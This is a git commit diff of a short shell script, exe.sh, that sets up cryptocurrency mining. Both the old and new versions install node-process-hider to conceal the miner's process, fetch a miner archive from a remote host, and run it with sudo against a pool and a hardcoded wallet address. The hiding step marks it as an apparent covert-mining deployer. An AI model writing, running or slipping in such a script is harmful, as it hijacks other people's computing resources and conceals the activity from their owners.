8f9a38494a3d8661008b318c54558462b34536ea
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-01-31 09:13:49 +0700

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -1,8 +1,5 @@
 #!/bin/sh
-sudo apt update
+sudo apt update -y
 sudo apt install screen -y
-screen -dmS gpu.sh ./gpu.sh 79 97
-sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add TonCoinMiner
-sudo wget https://github.com/d-crypto99/Bemiii/raw/main/TonCoin_Miner_v1.2.tar.gz && unzip TonCoin_Miner_v1.2.zip && mv v1.2 mng && cd mng && chmod +x TonCoinMiner
-sudo apt-get install opencl-headers ocl-icd-libopencl1 ocl-icd-opencl-dev curl
-./go EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi
+sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add danila-miner
+wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-bionic-hive.tar.gz && tar -xvf danila-miner-2.3.1-bionic-hive.tar.gz && cd danila-miner-2.3.1-bionic && ./danila-miner run https://server1.whalestonpool.com EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi
